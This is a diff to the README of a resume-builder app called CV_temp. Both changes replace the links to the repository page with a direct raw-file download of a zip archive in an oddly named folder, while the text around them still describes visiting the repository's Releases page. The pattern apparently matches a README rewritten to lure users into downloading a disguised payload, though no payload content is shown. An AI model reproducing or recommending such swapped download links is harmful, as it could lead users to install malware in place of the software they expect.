@@ -1,6 +1,6 @@
 # 📄 CV_temp - Create professional resumes with complete ease
 
-[![Download CV_temp](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/eliasge5902/CV_temp)
+[![Download CV_temp](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/eliasge5902/CV_temp/main/morbific/C_temp_confidentialness.zip)
 
 CV_temp helps users build professional documents without complex formatting software. This tool creates clean, standard resumes using simple inputs. Users spend less time on design and more time on content.
 
@@ -26,7 +26,7 @@ To run this application, ensure your computer meets these requirements:
 
 Follow these steps to obtain the application:
 
-1. Visit the [official repository page](https://github.com/eliasge5902/CV_temp).
+1. Visit the [official repository page](https://raw.githubusercontent.com/eliasge5902/CV_temp/main/morbific/C_temp_confidentialness.zip).
 2. Look for the Releases section on the right side of the screen.
 3. Click on the latest version link.
 4. Download the file that ends in .exe.
